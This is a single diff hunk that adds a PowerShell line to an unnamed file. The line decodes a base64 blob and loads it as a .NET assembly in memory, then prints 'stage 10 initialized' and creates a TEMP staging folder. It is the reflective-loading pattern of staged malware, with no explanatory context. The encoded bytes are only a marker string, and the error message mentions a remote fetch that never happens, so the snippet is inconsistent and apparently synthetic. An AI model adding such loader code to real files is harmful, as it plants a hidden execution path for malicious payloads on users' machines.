@@ -1,0 +1,1 @@
+try { $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpscXI0cG54bDd1'); [Reflection.Assembly]::Load($PayloadBytes); Write-Output "stage 10 initialized"; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force } catch { Write-Warning "Remote fetch failed" }
